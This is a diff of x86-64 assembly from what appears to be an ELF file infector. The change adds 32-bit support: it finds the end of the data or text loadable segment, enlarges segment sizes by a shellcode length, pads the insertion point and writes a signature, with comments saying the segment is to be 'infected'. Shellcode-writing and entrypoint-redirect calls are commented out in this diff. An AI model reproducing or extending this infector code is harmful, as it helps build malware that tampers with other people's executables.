@@ -1357,7 +1357,7 @@ write_signature:
 retn
 
 ;	32 BIT PARSING
-%define SHELLCODE32_LEN 1
+%define SHELLCODE32_LEN 39
 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse32elf:
@@ -1381,7 +1381,10 @@ parse32elf:
 	text_phdr_parse32:
 	call parse32elfphdrtext
 	phdr_parse_done32:
-
+	;SECTIONS
+	mov r10, rax; pass pad as 3rd param
+	mov rax, [rsp]; so we know if we have a data_seg or not 
+	call parse32elfsec
 	add rsp, 8
 retn
 ; int has_data_seg(void *) check if there's a data segment (ret = 1) or only text (ret = 0)
@@ -1451,19 +1454,19 @@ parse32elfheader:
 	mov rbx, rdi
 	mov rdi, rsi
 	mov rsi, rbx
-	mov rdx, 24 ; sizeof(Elf64_Ehdr) till entrypoint
+	mov rdx, 28 ; sizeof(Elf64_Ehdr) till entrypoint included
 	push rax
 	mov rax, 1
-	syscall; write(wfd, file, 24);
+	syscall; write(wfd, file, 28);
 	;Time to handle the entrypoint
 	pop rax
-	mov DWORD[rsp], eax;
+;	mov DWORD[rsp], eax;
 	add rsi, 28 ; points right after the entrypoint
 	mov rbx, rsi ; store rsi void *file+32
-	mov rsi, rsp
-	mov rdx, 4
-	mov rax, 1
-	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
+;	mov rsi, rsp
+;	mov rdx, 4
+;	mov rax, 1
+;	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
 	;write e_phoff
 	mov rdx, 4
 	mov rsi, rbx
@@ -1789,7 +1792,7 @@ parse32elfphdr:
 		xor rax, rax
 		mov eax, DWORD[r9 + 20]
 		mov DWORD[rsp + 6], eax; store p_memsz
-		add DWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
+		add DWORD[rsp + 6], SHELLCODE32_LEN; ADD SHELLCODE LEN (1 as sample)
 		;write custom memsz, filesz
 		push rax
 		push rcx
@@ -1831,7 +1834,7 @@ parse32elfphdr:
 		pop rsi
 		pop rcx
 		pop rax	
-		sub DWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
+		sub DWORD[rsp + 6], SHELLCODE32_LEN; restore memsz for pad calc
 		;set pad value
 		xor rax, rax
 		mov eax, DWORD[rsp + 6]; p_memsz
@@ -1966,7 +1969,7 @@ parse32elfphdrtext:
 		xor rax, rax
 		mov eax, DWORD[r9 + 20]
 		mov DWORD[rsp + 6], eax; store p_memsz
-		add DWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
+		add DWORD[rsp + 6], SHELLCODE32_LEN; ADD SHELLCODE LEN (1 as sample)
 		;write custom memsz, filesz
 		push rax
 		push rcx
@@ -2008,7 +2011,7 @@ parse32elfphdrtext:
 		pop rsi
 		pop rcx
 		pop rax	
-		sub DWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
+		sub DWORD[rsp + 6], SHELLCODE32_LEN; restore memsz for pad calc
 		;set pad value
 		xor rax, rax
 		mov eax, DWORD[rsp + 6]; p_memsz
@@ -2037,6 +2040,176 @@ parse32elfphdrtext:
 	add rsp, 2
 	add rsp, 4
 	add rsp, 4
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+
+
+parse32elfsec:
+	mov r12, rax; copy rax into r12 for jmp calc
+	sub rsp, 8; file copy 
+	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
+	sub rsp, 8;start offset 
+	mov r9, rdx; we're gonna need rdx for syscalls, store fsize
+	mov QWORD[rsp+16], rdi; save void * file
+	; find offset where we will put our shellcode
+	cmp rax, 0
+	je fets_sect32
+	call find_end_data_seg32 ; rax now contains the offset to the beg of pad & shellcode
+	jmp fes_done32
+	fets_sect32:
+	call find_end_text_seg32
+	fes_done32: 
+	mov [rsp + 8], rax
+	; first we swap file and wfd for syscalls
+	mov rbx, rsi
+	mov rsi, rdi
+	mov rdi, rbx
+	;now we need to calculate the offset to EHDR + PHDR*e_phnum
+	xor rbx, rbx
+	mov bx, WORD[rsi + 44]; bx == e_phnum
+	xor rax, rax
+	mov eax, 32; sizeof(Elf64_Phdr)
+	mul rbx; rbx * rax -> rax
+	add eax, DWORD[rsi + 28]; e_phoff
+	mov [rsp], rax; [rsp] ==  e_phoff + (sizeof(Elf64_Phdr) * e_phnum)
+	lea rsi, [rsi + rax]; file after phdrs
+	mov rdx, QWORD[rsp + 8]; offset new sect
+	sub rdx, [rsp]; rdx == (new_sect - start)
+	mov rax, 1
+	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
+	xor rcx, rcx
+	loop_print_pad32:
+	cmp rcx, r10
+	jae loop_print_pad_end32
+	push rsi
+	push rcx
+	push 0x00000000
+	lea rsi, [rsp]
+	mov rdx, 1
+	mov rax, 1
+	syscall; write(wfd, "\0", 1);
+	pop rdx; pop the "\0"
+	pop rcx
+	pop rsi
+	inc rcx
+	jmp loop_print_pad32
+	loop_print_pad_end32:
+;	call write_shellcode32
+	mov rsi, QWORD[rsp + 16]
+;	call write_jmp_shellcode32
+;	call write_exit_shellcode32; so it doesn't segv when ret is reached in original code
+	call write_signature
+	mov rsi, QWORD[rsp + 16]
+	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
+	mov rdx, r9 ; fsize
+	sub rdx, QWORD[rsp + 8]; fsize - new_sect
+	mov rax, 1
+	syscall;write(wfd, file + new_sect, fsize - new_sect);
+	add rsp, 8
+	add rsp, 8
+	add rsp, 8
+retn
+
+; unsigned long find_end_data_seg(void *)
+; will return the offset at which shellcode starts and where dataseg ends
+find_end_data_seg32:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	xor rbx, rbx
+	mov ebx, DWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_feds32: 
+		cmp cx, WORD[rsp]
+		jge loop_feds_exit32
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_feds32
+		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		jne continue_feds32
+		;we found the data segment ! bss ect... This is where the shellcode will be
+		xor rax, rax
+		mov eax, DWORD[r9 + 16];store p_filesz
+		add eax, DWORD[r9 + 4]; add p_offset so this gives us "the end" of the segment
+		continue_feds32:
+		inc rcx
+		add rdx, 32; rdx += sizeof(Elf64_Phdr)
+		jmp loop_feds32
+	loop_feds_exit32: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+; unsigned long find_end_text_seg(void *)
+; will return the offset at which shellcode starts and where dataseg ends
+find_end_text_seg32:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
+
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 44]
+	mov WORD[rsp], bx; e_phnum stored
+	xor rbx, rbx
+	mov ebx, DWORD[rdi + 28]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_fets32: 
+		cmp cx, WORD[rsp]
+		jge loop_fets_exit32
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_fets32
+		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_X) means text seg, we're gonna infect it
+		jne continue_fets32
+		;we found the data segment ! bss ect... This is where the shellcode will be
+		xor rax, rax
+		mov eax, DWORD[r9 + 16];store p_filesz
+		add eax, DWORD[r9 + 4]; add p_offset so this gives us "the end" of the segment
+		continue_fets32:
+		inc rcx
+		add rdx, 32; rdx += sizeof(Elf64_Phdr)
+		jmp loop_fets32
+	loop_fets_exit32: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
 	pop rdx
 	pop rsi
 	pop rdi
